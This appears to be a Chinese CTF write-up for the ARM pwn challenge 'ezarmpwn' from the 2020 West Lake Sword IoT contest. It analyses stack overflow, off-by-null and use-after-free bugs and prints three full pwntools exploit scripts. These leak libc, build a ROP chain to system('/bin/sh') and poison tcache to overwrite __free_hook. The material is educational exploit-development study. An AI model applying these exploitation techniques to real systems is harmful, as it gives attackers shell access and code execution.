@@ -1,0 +1,457 @@
+# 西湖论剑 IoT闯关赛 2020 pwn3 —— ezarmpwn
+
+阅读量 **273861**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2020-12-16 10:00:38
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t01223163876e5cb4a0.jpg)
+
+## 前言
+
+打了安恒举办的西湖论剑比赛，题目都是跑在一个开发板上的，通过数据线连接开发板的otg接口能访问题目环境。pwn题目一共有三道，其中有一道题目因为逻辑上的问题导致能比较简单的获得flag，另外一道题目是boa服务器在处理http认证过程中，发生栈溢出。我们这里分析的是这次比赛的第三道pwn题ezarmpwn。
+
+## 题目分析
+
+通过file和checksec能够知道程序为32位的arm小端程序，开启NX保护，没有PIE和canary保护。
+
+![](https://p2.ssl.qhimg.com/t0110e4ba043c22ba61.png)
+
+主办方给出的libc为2.30，把libc解压的文件夹和题目放在同一个目录，使用`qemu-arm -L ./
+./pwn3`执行程序，能看到首先要求输入用户名和密码，之后进入到菜单选项。
+
+![](https://p2.ssl.qhimg.com/t010aa06b0215cb584c.png)
+
+play选项有两个子功能，add和delete，能分配chunk和释放chunk；私人信息是输出用户名和密码的内容；修改密码输入字符串修改原始的密码；选项4会退出程序，从功能上看是一道典型的libc菜单题。
+
+## 漏洞分析
+
+这道题的漏洞非常多，有一些漏洞很有干扰性。首先用户名和密码都是固定长度的buffer，大小如下：
+
+![](https://p0.ssl.qhimg.com/t01c30737b7a4764b6e.png)
+
+###  栈溢出1
+
+密码和用户名被带进注册函数中，这里输入的用户名直接通过scanf进入src没有任何限制，直接溢出。
+
+![](https://p2.ssl.qhimg.com/t0113b90fcfa1e59c82.png)
+
+###  off by null
+
+在栈溢出下方有一个off by
+null的漏洞，如果我们在输入的密码中没有`\n`就会持续移动指针，最后在有`\n`的地方赋值为0，不过这个漏洞太难利用非常鸡肋。
+
+###  UAF
+
+在play的选项中的结构为下方所示：
+
+    
+    
+    struct {
+        int size;
+        char* content;
+    }
+    
+
+最后在delete操作中没有对指针置空，存在UAF漏洞。
+
+![](https://p0.ssl.qhimg.com/t016d70ffc549c25886.png)
+
+###  栈溢出2
+
+我们知道密码的buffer长度为40，这里strncpy直接复制了0x48（72）长度的字符串，直接溢出。
+
+![](https://p5.ssl.qhimg.com/t01445979ed6b583a99.png)
+
+以上就是能够观察到的漏洞了，虽然我们有两个非常有用的栈溢出漏洞，但是我们需要泄露出libc地址，才能继续完成利用，不管是进行ROP还是利用UAF向`__free_hook`写地址都是需要libc地址的，所以拿到libc地址成为了我们的首要目标。
+
+## 漏洞利用
+
+最开始，我的想法是直接利用第一个栈溢出漏洞进行ROP，也找到了一些gadget，最后发现此路不通，程序本身的gadget十分少再加上程序的函数got地址都带有`0x20`，这个字符在scanf的时候回产生截断，导致rop失败。所以没有办法像x86那样用puts等泄露函数输出函数地址来计算得到libc地址。
+
+那么另外一个栈溢出漏洞又如何呢？分析之后发现只能控制PC，没有足够的溢出长度来完成ROP。于是在比赛的时候，我就陷入了绝望，有没有什么方法可以获取到libc呢？在参考了`pzhxbz`师傅的exp之后恍然大悟，原来可以在栈上找libc地址通过strncpy连带着拷贝到password的buffer中，随后利用输出信息功能泄露字符串获得libc地址。看来以后在出现了输出功能的地方都要留个心眼，看看能不能有方法输出栈上的libc地址信息。
+
+###  leak libc
+
+在read到临时buffer栈空间中，可以看到有libc相关的函数地址，所以只要我们填充40字节的数据，在执行strncpy的时候就会连带着这个地址一起进入paasword中。
+
+![](https://p2.ssl.qhimg.com/t0168c09f644b67fb14.png)
+
+查看完成strncpy之后的的password，可以看到已经把后面的libc地址一起连带复制进buffer中。
+
+![](https://p3.ssl.qhimg.com/t01c29e1db0524d20ae.png)
+
+我们调用输出信息的功能就可以看到泄露出的libc地址。
+
+![](https://p3.ssl.qhimg.com/t013c1b16143d24c0a5.png)
+
+减去libc的基地址成功获得相对于libc的偏移。
+
+![](https://p5.ssl.qhimg.com/t011ce0d53df6273db3.png)
+
+    
+    
+    change('a'*40)
+    info()
+    io.recvuntil('a'*40)
+    libc_addr = u32(io.recv(4)) - 0x32248
+    print('libc_addr: ' + hex(libc_addr))
+    
+
+###  control pc and rop
+
+有了libc地址之后，这下就非常容易了，利用第二个栈溢出漏洞控制PC到最开始的地方触发第一个栈溢出漏洞完成rop。这里rop的思路是利用libc地址得到system和/bin/sh，使用gadget执行system函数。
+
+    
+    
+    #.text:000A1A5C                 MOV     R0, R4
+    #0x00010784 : pop {r4, pc}
+    change(b'a'*64 + p32(0x10e70))
+    io.sendlineafter('choice > ', '4')
+    payload = b'c' * 0x1c + p32(0x10784) + p32(bin_sh) + p32(libc_addr + 0xa1a5c) + p32(system)
+    
+
+这里还需要注意的一点是，我们溢出的部分覆盖了password的buffer，因此在输入密码的时候必须控制输入的内容，让字符串复制之后的rop
+chain依旧可以运行。在libc中找到如下的gadget：
+
+![](https://p4.ssl.qhimg.com/t017d11bb81dac354ba.png)
+
+虽然最后一个字节有差异但指令却是相同的，这样我们输入空密码最终在字符串复制时也只会复制一个空字节，对我们的rop chain将不会有任何影响。
+
+我在测试的时候有很多坏字符的干扰，比如`0x0a`和`0x20`，比较难受的是system函数的地址中恰好带有`0x20`所以整个exp在本地是没有办法复现的，只能在开发板上能成功。
+
+###  UAF
+
+在完成泄露libc地址之后，也可以不使用上面的栈溢出攻击方法，转而利用uaf漏洞完成堆利用的攻击。这里有两个利用思路，一个是很容易想到的double
+free，另外一个是构造出chunk overlap。
+
+因为有tcache，要构造double
+free需要先把tcache填满，然后使用之前free一个再free另外一个最后再次free第一次free的chunk。
+
+    
+    
+    for i in range(10):
+        add(i,0x30,'/bin/sh\x00')
+    
+    for i in range(7):
+        dele(i)
+    
+    dele(7)
+    dele(8)
+    dele(7)
+    
+
+在有tcache的情况下会优先分配tcache中的chunk，所以再把tcache链表中的7个chunk全部分配，在这之后申请的第一个chunk修改它的指针让其指向我们想写入的地址`__free_hook`，再分配三次，第三次写入system地址到`__free_hook`中，最后随便free一个内容为`/bin/sh\x00`的chunk即可getshell。
+
+    
+    
+    for i in range(7):
+        add(20+i,0x30,'/bin/sh\x00')
+    
+    add(30,0x30,p32(libc+e.symbols['__free_hook']))
+    print(hex(libc+e.symbols['__free_hook']))
+    add(31,0x30,'test')
+    add(32,0x30,'test')
+    add(34,0x30,p32(libc+e.symbols['system']))
+    add(11,10,'/bin/sh\x00')
+    
+    dele(11)
+    
+
+另外一个思路是构造出chunk
+overlap，申请两个较大的chunk，释放之后申请一个更大的chunk，使得之前较小的两个chunk合并，这样新申请的大chunk能够修改到其中一个小chunk的header。把header改成tcache的范围，free这个chunk，让它进入tcache中，这个时候重复释放和分配大chunk就能修改tcache的指针，剩下来的操作和上面的相同。
+
+    
+    
+    for i in range(9):
+       add(i,0x40,"aaaa\n")
+    add(15,6,"a\n") #0x10
+    add(14,6,"a\n") #0x10
+    delete(15) 
+    delete(14) #tcache[0x10]=14->15
+    for i in range(9):
+       delete(8-i) #unsorted bin 0->1 
+    free_hook = libc + 0x1479cc
+    system    = libc + 0x3a028
+    add(9,0x70,"a"*0x40+p32(0)+p32(0x11)+p32(0)*3+p32(0x39)+"\n") #overchunk
+    delete(1) #tcache[0x10] = 1->14->15
+    delete(9)  
+    add(10,0x70,"a"*0x40+p32(0)+p32(0x11)+p32(free_hook)*3+p32(0x39)+p32(libc+0x1479cc)+"\n")
+    add(11,8,"/bin/sh\x00")
+    add(12,8,p32(libc+0x3a028)+"\n")
+    # print hex(libc+0x1479cc)
+    delete(11)
+    p.interactive()
+    
+
+## 最终exp
+
+这是栈溢出的exp
+
+    
+    
+    from pwn import *
+    
+    elf = ELF('./pwn3')
+    libc = ELF('./lib/libc-2.30.so')
+    context.arch= 'arm'
+    
+    if args['D']:
+        context.log_level = 'debug'
+    
+    if args['R']:
+        io = remote('')
+    else:
+        io = process(['qemu-arm', '-g', '1234', '-L', './', './pwn3'])
+    
+    
+    def add(my_id, size, content):
+        io.sendlineafter('choice > ', '1')
+        io.sendlineafter('choice > ', '1')
+        io.sendlineafter('index: ', str(my_id))
+        io.sendlineafter('size: ', str(size))
+        io.sendafter('content: ', content)
+    
+    
+    def delete(my_id):
+        io.sendlineafter('choice > ', '1')
+        io.sendlineafter('choice > ', '2')
+        io.sendlineafter('index: ', str(my_id))
+    
+    
+    def info():
+        io.sendlineafter('choice > ', '2')
+    
+    
+    def change(content):
+        io.sendlineafter('choice > ', '3')
+        io.sendafter('Please Input new password:', content)
+        io.sendlineafter('continue', '')
+    
+    pause()
+    
+    io.sendlineafter('Please registered account \nInput your username:', 'xxxx')
+    io.sendlineafter('Please input password:', '2333')
+    io.sendlineafter('Please input password again:', '2333')
+    io.sendlineafter('continue ...', '')
+    
+    '''
+    0x10f58 mov r0, r7; blx r3;
+    0x10a90 mov r0, r3; pop {fp, pc};
+    0x105c8 : pop {r3, pc}
+    0x10784 : pop {r4, pc}
+    '''
+    pause()
+    change('a'*40)
+    info()
+    
+    io.recvuntil('a'*40)
+    libc_addr = u32(io.recv(4)) - 0x32248
+    print('libc_addr: ' + hex(libc_addr))
+    
+    change(b'a'*64 + p32(0x10e70))
+    
+    io.sendlineafter('choice > ', '4')
+    
+    bin_sh = libc_addr + 1212228
+    system = libc_addr + 237608
+    payload = b'c' * 0x1c + p32(0x10784) + p32(bin_sh) + p32(libc_addr + 0xa1a5c) + p32(system)
+    
+    io.sendlineafter('username:', payload)
+    io.sendlineafter('password:', '')
+    pause()
+    io.sendlineafter('again:', '')
+    
+    io.sendlineafter('continue', '')
+    
+    io.interactive()
+    
+
+这是利用uaf的两个exp，第一个为double free，第二个为chunk overlap。
+
+    
+    
+    from pwn import *
+    
+    #context.log_level='debug'
+    #p=process(["qemu-arm","-L","/usr/arm-linux-gnueabihf","./pwn3"])
+    #p=process(["qemu-arm","-L","../","pwn3"])
+    e=ELF('../lib/libc-2.30.so')
+    #p=process(["qemu-arm","-g",'1234',"-L","../","./pwn3"])
+    p=remote("20.20.11.14",9999)
+    
+    p.sendlineafter('username:','yzloser')
+    p.sendlineafter('password:','yzloser')
+    p.sendlineafter('again:','yzloser')
+    p.sendlineafter('continue','')
+    p.sendlineafter('choice','3')
+    p.sendlineafter('password:','A'*0x27)
+    p.sendlineafter('continue','')
+    p.sendlineafter('choice','2')
+    p.recvuntil(b'A'*0x27+b'\n')
+    
+    libc=u32(p.recv(4))-205384
+    
+    def add(idx,siz,s):
+        p.sendlineafter('choice','1')
+        p.sendlineafter('choice','1')
+        p.sendlineafter('index',str(idx))
+        p.sendlineafter('size',str(siz))
+        p.sendlineafter('content',s)
+    
+    
+    def dele(idx):
+        p.sendlineafter('choice','1')
+        p.sendlineafter('choice','2')
+        p.sendlineafter('index',str(idx))
+    
+    
+    print(hex(libc))
+    
+    for i in range(10):
+        add(i,0x30,'/bin/sh\x00')
+    
+    
+    for i in range(7):
+        dele(i)
+    # double free
+    dele(7)
+    dele(8)
+    dele(7)
+    
+    for i in range(7):
+        add(20+i,0x30,'/bin/sh\x00')
+    
+    
+    add(30,0x30,p32(libc+e.symbols['__free_hook']))
+    print(hex(libc+e.symbols['__free_hook']))
+    add(31,0x30,'test')
+    add(32,0x30,'test')
+    add(34,0x30,p32(libc+e.symbols['system']))
+    add(11,10,'/bin/sh\x00')
+    
+    dele(11)
+    
+    p.interactive()
+    
+    
+    
+    from pwn import *
+    
+    
+    context.log_level="debug"
+    def info():
+       p.sendlineafter("> ","2")
+    
+    
+    def play():
+       p.sendlineafter("> ","1")
+    
+    
+    def add(index,size,note):
+       play()
+       p.sendlineafter("> ","1")
+       p.sendafter(": ",str(index))
+       p.sendlineafter(": ",str(size))
+       p.sendafter(": ",note)
+    
+    
+    def delete(index):
+       play()
+       p.sendlineafter("> ","2")
+       p.sendlineafter(": ",str(index))
+    
+    p=process(["qemu-arm","-g","1234","-L",".","./pwn3"])
+    #p = remote("20.20.11.14", 9999)
+    
+    
+    un="aaaaa"
+    pd1="bbbbb"
+    pd2="bbbbb"
+    p.sendlineafter(":",un)
+    p.sendlineafter(":",pd1)
+    p.sendlineafter(":",pd2)
+    p.sendline("")
+    
+    
+    p.sendlineafter("> ","3")
+    p.sendlineafter(":","a"*0x20)
+    p.sendline("")
+    
+    
+    info()
+    p.recvuntil(": ")
+    libc=u32(p.recv(4))+0xff69cba0-0x044ba0-0xff68a248
+    # print hex(libc)
+    
+    
+    for i in range(9):
+       add(i,0x40,"aaaa\n")
+    add(15,6,"a\n") #0x10
+    add(14,6,"a\n") #0x10
+    delete(15) 
+    delete(14) #tcache[0x10]=14->15
+    for i in range(9):
+       delete(8-i) #unsorted bin=0->1 
+    free_hook = libc + 0x1479cc
+    system    = libc + 0x3a028
+    add(9,0x70,"a"*0x40+p32(0)+p32(0x11)+p32(0)*3+p32(0x39)+"\n") #overchunk
+    delete(1) #tcache[0x10] = 1->14->15
+    delete(9)  
+    add(10,0x70,"a"*0x40+p32(0)+p32(0x11)+p32(free_hook)*3+p32(0x39)+p32(libc+0x1479cc)+"\n")
+    add(11,8,"/bin/sh\x00")
+    add(12,8,p32(libc+0x3a028)+"\n")
+    # print hex(libc+0x1479cc)
+    delete(11)
+    p.interactive()
+    #0x14675c -- main_arena
+    
+
+## 总结
+
+这道arm的题目赛后发现也不难，关键还是在比赛的时候没有能够熟练的分析。在堆分析中有一个很重要的一点，在用gdb插件调试的时候，加载没有调试符号的libc无法使用bins，chunks等命令。这时，只能自己手动在内存中查找这些数据，比如tcache的管理结构是在heap最开始的地方，而bins则在main_arena上。
+
+## 引用
+
+<https://mp.weixin.qq.com/s/x19DiiitMeAm5VAupqzfdg>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **hurricane618** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/224972](/post/id/224972)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [IoT](/tag/IoT)
+  * [CTF](/tag/CTF)
+  * [arm](/tag/arm)
+
+ **+1** __1赞
+
+ __收藏
+
+![](https://p2.ssl.qhimg.com/t01edac59ecef59b68a.png) hurricane618
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
